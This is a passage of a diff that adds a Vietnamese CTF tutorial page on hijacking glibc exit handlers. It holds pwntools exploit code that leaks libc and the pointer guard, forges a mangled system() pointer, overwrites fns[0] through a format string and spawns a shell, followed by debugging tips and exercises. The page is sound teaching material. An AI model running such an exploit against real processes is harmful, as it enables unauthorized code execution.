+p.sendline(fmtstr_payload(<span class="d">6</span>, {
+    libc.address+<span class="d">0x1ed678</span>: stored,
+    libc.address+<span class="d">0x1ed680</span>: <span class="k">next</span>(libc.search(b<span class="s">"/bin/sh"</span>)),
+}))
+p.sendline(b<span class="s">"id"</span>); p.interactive()</code></pre>
+<div class="note tip"><span class="tag">Zero-guard</span>Nếu write-tùy-ý đủ mạnh &amp; biết địa chỉ TLS: ghi <code>fs:0x30 = 0</code> trước → <code>stored = rol(system, 0x11)</code>, khỏi leak guard.</div>
+  </div>
+
+  <div class="tabpanel" id="panel-c" hidden>
+<pre><code><span class="c"># BẢN C — pwnld: fmtstr_payload re-export + rebase_libc.</span>
+<span class="k">from</span> pwnld <span class="k">import</span> *
+context.binary = exe = ELF(<span class="s">"./vuln"</span>, checksec=<span class="k">False</span>); libc = get_libc(<span class="s">"./libc.so.6"</span>)
+p = start()
+rol = <span class="k">lambda</span> v,n:((v&lt;&lt;n)|(v&gt;&gt;(<span class="d">64</span>-n)))&amp;(<span class="d">2</span>**<span class="d">64</span>-<span class="d">1</span>)
+sl(b<span class="s">"%21$p|%POS_GUARD$p"</span>); a,b = rl().split(b<span class="s">"|"</span>)
+rebase_libc(leak=<span class="k">int</span>(a,<span class="d">16</span>), offset=<span class="d">0x24083</span>); guard = <span class="k">int</span>(b,<span class="d">16</span>)
+stored = rol(LIBC.sym.system ^ guard, <span class="d">0x11</span>)
+sl(fmtstr_payload(<span class="d">6</span>, {LIBC.address+<span class="d">0x1ed678</span>: stored,
+                       LIBC.address+<span class="d">0x1ed680</span>: <span class="k">next</span>(LIBC.search(b<span class="s">"/bin/sh"</span>))}))
+sl(b<span class="s">"id"</span>); ia()</code></pre>
+<div class="note"><span class="tag">pwnld</span><code>rebase_libc</code> lo leak libc; <code>fmtstr_payload</code> re-export. Phần mangle tự tính (rol helper).</div>
+  </div>
+
+  <h3>Checklist khi exit không nhảy đúng</h3>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>exit chạy nhưng không gọi target</h4><p>flavor ≠ 4 (ef_cxa) hoặc idx=0. Ghi flavor=4, idx=1.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>Nhảy tới địa chỉ rác</h4><p>Quên mangle, hoặc guard sai. Kiểm guard bằng gdb fs:0x30.</p></div></div>
+  <div class="reqitem"><span class="ico">🔎</span><div><h4>system(rác) không ra shell</h4><p>Quên ghi fns[0].arg = &"/bin/sh". flavor=4 gọi fn(arg).</p></div></div>
+ </div>
+</section>
+
+<!-- 08 Công cụ -->
+<section class="block" id="s8">
+ <div class="wrap">
+  <div class="secnum">08 / CÔNG CỤ</div>
+  <h2>Hộp đồ nghề</h2>
+  <div class="grid">
+    <div class="card"><div class="term">gdb</div><h4>Struct &amp; guard</h4><p><code>p *__exit_funcs</code>, <code>fs:0x30</code>, <code>disas __run_exit_handlers</code>.</p></div>
+    <div class="card"><div class="term">pwntools fmtstr_payload</div><h4>Ghi fn+arg</h4><p>Ghi <code>stored</code> &amp; <code>&amp;/bin/sh</code>.</p></div>
+    <div class="card"><div class="term">rol/ror helper</div><h4>Mangle</h4><p><code>rol(system^guard, 0x11)</code>.</p></div>
+    <div class="card"><div class="term">libc source</div><h4>Đúng layout</h4><p><code>stdlib/exit.c</code>, <code>cxa_atexit.c</code>.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 09 Gỡ lỗi -->
+<section class="block" id="s9">
+ <div class="wrap">
+  <div class="secnum">09 / GỠ LỖI</div>
+  <h2>Khi exit không nhảy đúng</h2>
+  <div class="grid">
+    <div class="card"><h4>Quên mangle</h4><p>Ghi target trần → demangle ra rác → crash. Phải ghi <code>rol(target^guard,0x11)</code>.</p></div>
+    <div class="card"><h4>Guard sai</h4><p>Leak nhầm ô. <code>fs:0x30</code> khác canary (<code>fs:0x28</code>). Xác nhận bằng gdb.</p></div>
+    <div class="card"><h4>flavor/idx sai</h4><p>flavor phải 4 (ef_cxa), idx≥1. Nếu không, entry không được gọi.</p></div>
+    <div class="card"><h4>Offset struct sai version</h4><p>Vị trí fns[0].fn khác theo glibc. Đọc struct thực tế trong gdb.</p></div>
+    <div class="card"><h4>Chương trình không exit</h4><p>Luồng không tới exit/return → handler không chạy. Ép thoát (EOF…).</p></div>
+    <div class="card"><h4>Zero-guard không được</h4><p>Không ghi được fs:0x30 (TLS) → bắt buộc leak guard.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ & NHẬN DIỆN</div>
+  <h2>Exit handler vs các đích khác</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Tình huống</th><th></th><th>Hướng</th></tr></thead>
+    <tbody>
+      <tr><td>GOT ghi được (Partial RELRO)</td><td class="maybe">⚠️</td><td>Ghi GOT đơn giản hơn (khỏi mangle)</td></tr>
+      <tr><td>Full RELRO + có guard/zero-guard</td><td class="yes">✅</td><td>exit handler (bài này)</td></tr>
+      <tr><td>Full RELRO + không có guard</td><td class="maybe">⚠️</td><td><a href="fsop.html">FSOP</a> (không mangle) thường dễ hơn</td></tr>
+      <tr><td>Chương trình không exit</td><td class="no">❌</td><td>Đích vô dụng; tìm con trỏ hàm khác</td></tr>
+      <tr><td>tls_dtor_list / __call_tls_dtors</td><td class="maybe">⚠️</td><td>Biến thể tương tự (cũng mangle)</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">Biến thể glibc</span>Offset <code>initial</code>/<code>__exit_funcs</code> &amp; cách mangling ổn định qua 2.27–2.33 (rol 0x11 với fs:0x30). glibc mới cũng giữ cơ chế này → exit handler vẫn dùng được khi hook đã mất (≥2.34), miễn leak được guard. x86 (32-bit): mangling dùng <code>rol 9</code> với gs:0x18.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐⭐⭐ · Leak guard + forge</div><p>Biên dịch <code>vuln.c</code> Full RELRO. Leak libc + guard, forge <code>mangle(system)</code>, ghi fns[0].fn + arg, return → shell.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · Zero-guard</div><p>Dùng write-tùy-ý ghi <code>fs:0x30 = 0</code>, rồi chỉ cần <code>rol(system, 0x11)</code>.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · So với FSOP</div><p>Giải cùng bài bằng <a href="fsop.html">FSOP</a> và so độ khó (không mangle).</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">__exit_funcs</div><p>Con trỏ danh sách hàm exit (→ initial).</p></div>
+    <div class="card"><div class="term">__run_exit_handlers</div><p>Hàm duyệt &amp; gọi danh sách exit.</p></div>
+    <div class="card"><div class="term">PTR_MANGLE</div><p>rol(ptr⊕guard,0x11).</p></div>
+    <div class="card"><div class="term">guard / fs:0x30</div><p>Khóa ngẫu nhiên cho mangling (TLS).</p></div>
+    <div class="card"><div class="term">flavor</div><p>4=ef_cxa (gọi fn(arg)); 0=bỏ qua.</p></div>
+    <div class="card"><div class="term">rol / ror</div><p>Xoay bit trái/phải 0x11 (64-bit).</p></div>
+    <div class="card"><div class="term">Full RELRO</div><p>Khóa GOT binary (không khóa data libc).</p></div>
+    <div class="card"><div class="term">tls_dtor_list</div><p>Biến thể destructor TLS, cũng mangle.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Bài liên quan: <a href="fmtstr.html">fmtstr</a> · <a href="fsop.html">fsop</a> · <a href="leak_techniques.html">leak_techniques</a>.</li>
+    <li>glibc <code>stdlib/exit.c</code> · <code>stdlib/cxa_atexit.c</code> · <code>sysdeps/.../pointer_guard</code>.</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 3 · Bài 17.</strong> Exit handler = con trỏ hàm chạy khi exit, trong data libc (ghi được kể cả Full RELRO). 2.31: fns[0].fn @ libc+0x1ed678, mangle = rol(target⊕guard,0x11), guard=fs:0x30. Nhớ flavor=4, idx≥1. Tiếp theo Phase 4: HEAP.</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("exh-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("exh-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  function hx(b){if(b<0n)b=0n;return "0x"+b.toString(16);}
+  function pv(s){s=(s||"").trim();try{if(/^0x[0-9a-f]+$/i.test(s))return BigInt(s);if(/^\d+$/.test(s))return BigInt(s);}catch(e){}return null;}
+  var MASK=(1n<<64n)-1n;
+  function rol(v,n){v&=MASK;return ((v<<n)|(v>>(64n-n)))&MASK;}
+  var mT=document.getElementById("mT"),mG=document.getElementById("mG"),mZero=document.getElementById("mZero"),mOut=document.getElementById("mOut");
+  function calc(){
+    var t=pv(mT.value),g=mZero.checked?0n:pv(mG.value);
+    if(t===null||g===null){mOut.innerHTML='<div class="ro">nhập số hợp lệ</div>';return;}
+    var xored=(t^g)&MASK;
+    var stored=rol(xored,0x11n);
+    mOut.innerHTML=
+      '<div class="ro"><span>target ⊕ guard</span><b>'+hx(xored)+'</b></div>'+
+      '<div class="ro res"><span>stored = rol(.., 0x11)</span><b>'+hx(stored)+'</b></div>'+
+      '<div class="ro" style="font-size:12px"><span>ghi vào fns[0].fn (libc+0x1ed678)</span><b>'+(mZero.checked?'(guard=0)':'')+'</b></div>';
+  }
+  [mT,mG].forEach(function(e){e.addEventListener("input",calc);});
+  mZero.addEventListener("change",function(){mG.disabled=mZero.checked;calc();});
+  calc();
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
